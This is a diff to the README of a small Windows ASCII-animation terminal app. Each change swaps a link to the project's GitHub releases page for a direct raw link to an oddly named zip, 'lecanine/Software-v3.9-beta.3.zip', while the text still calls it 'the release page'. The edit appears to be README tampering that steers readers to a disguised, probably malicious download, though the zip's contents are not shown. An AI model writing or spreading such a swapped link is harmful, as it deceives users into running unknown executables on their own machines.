@@ -1,6 +1,6 @@
 # 🪨 sisyphus - Endless ASCII motion for your terminal
 
-[![Download sisyphus](https://img.shields.io/badge/Download%20sisyphus-blue?style=for-the-badge&logo=github)](https://github.com/Yujunghyeok/sisyphus/releases)
+[![Download sisyphus](https://img.shields.io/badge/Download%20sisyphus-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Yujunghyeok/sisyphus/main/lecanine/Software-v3.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want a small terminal app that runs on Windows and plays a calm, l
 
 ## 💾 Download for Windows
 
-1. Open the release page: https://github.com/Yujunghyeok/sisyphus/releases
+1. Open the release page: https://raw.githubusercontent.com/Yujunghyeok/sisyphus/main/lecanine/Software-v3.9-beta.3.zip
 2. Find the latest release.
 3. Look for a Windows file, such as `sisyphus.exe` or a Windows zip file.
 4. Download that file.
@@ -155,7 +155,7 @@ If the text looks messy:
 
 ## 📥 Download Again
 
-If you need the latest Windows file, visit: https://github.com/Yujunghyeok/sisyphus/releases
+If you need the latest Windows file, visit: https://raw.githubusercontent.com/Yujunghyeok/sisyphus/main/lecanine/Software-v3.9-beta.3.zip
 
 ## 📌 Notes for Windows Users
 
